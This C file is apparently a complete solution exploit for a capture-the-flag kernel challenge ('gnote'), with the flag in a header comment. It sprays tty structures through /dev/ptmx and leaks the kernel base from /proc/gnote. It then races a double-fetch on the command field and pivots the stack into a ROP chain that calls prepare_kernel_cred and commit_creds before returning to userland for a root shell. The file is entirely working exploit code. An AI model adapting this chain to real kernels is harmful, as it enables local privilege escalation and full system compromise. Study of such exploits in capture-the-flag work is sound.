// musl-gcc exp.c -o exp -static -masm=intel
// TWCTF{Ga_ryo_is_master_of_note_creator}
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>


struct Req{
	uint32_t cmd;
	uint32_t val;
} req;

/*
void* job(){
	while(1){
		//req.cmd = 0x8000080;
		req.cmd = 0x70000000;
	}
}
*/

uint32_t race = 0x70000000;
void* job(){

	__asm__(
		"mov eax,%1;"
		"y: xchg eax,[%0];"
		"jmp y"
		::"r"(&req.cmd),"r"(race):"rax","memory"
		);
}


void get_shell(int sig){
	printf( "[*] get shell\n" );
	system("sh");
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
	signal( SIGSEGV ,get_shell );
	save_status();	

	int pfd[0x100];
	for( int i = 0 ; i < 0x100 ; ++i )
		pfd[i] = open( "/dev/ptmx" , O_RDWR | O_NOCTTY ); // tty_struct
	for( int i = 0 ; i < 0x100 ; ++i )
		close(pfd[i]);

	int fd = open( "/proc/gnote" , O_RDWR );

	req.cmd = 1;
	req.val = 0x2e0;
	write( fd , &req , sizeof( req ) );

	req.cmd = 5;
	req.val = 0;
	write( fd , &req , sizeof( req ) );
	size_t buf[0x100] = {0};
	read( fd , buf , sizeof(buf) );
	size_t kaddr = buf[3] - 0x1a35360;

	printf( "[*] kernel base -> %p\n", kaddr );
	

	size_t pivot = kaddr + 0x11204ca; // call rax ; mov esp, eax; mov rax, r12; pop rbx; pop r12; pop rbp; ret;
	printf( "[*] pivot gadget -> %p\n" , pivot );
	size_t* rsp = pivot & 0xffffffff; // eax -> esp
	printf( "[*] rsp -> %p\n" , rsp );
	size_t* new_stack = mmap( ((uint32_t)rsp & 0xfffff000) - 0x1000 , 0x4000 , PROT_EXEC | PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS , -1 , 0 );
	printf( "[*] new stack -> %p\n" , new_stack );


	int k = -1;
	rsp[++k] = 0x0;
	rsp[++k] = 0x0;
	rsp[++k] = 0x0;

	rsp[++k] = kaddr + 0x101c20d; // pop_rdi
	rsp[++k] = 0x0;
	rsp[++k] = kaddr + 0x1069fe0; // prepare
	rsp[++k] = kaddr + 0x1580579;
	rsp[++k] = 0x0;
	rsp[++k] = kaddr + 0x1069df0; // commit_creds
	rsp[++k] = kaddr + 0x103efc4; // swapgs
	rsp[++k] = 0x0;
	rsp[++k] = kaddr + 0x101dd06;
	rsp[++k] = (size_t)get_shell;
	rsp[++k] = user_cs;
	rsp[++k] = user_rflags;
	rsp[++k] = user_sp;
	rsp[++k] = user_ss;

	// cushion
	size_t *cushion = mmap( (void*)0x340000000, 0x700000 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED , -1 , 0 );
	printf( "[*] cushion area -> %p\n" , cushion );
	for( int i = 0 ; i < 0x700000 / 8 ; ++i )
		cushion[i] = pivot;


	pthread_t tid;
	pthread_create( &tid , NULL , job , NULL );
	printf( "racing\n" );

	req.cmd = 2;
	while(1){
		write( fd , &req , sizeof( req ) );
	}

	return 0;
}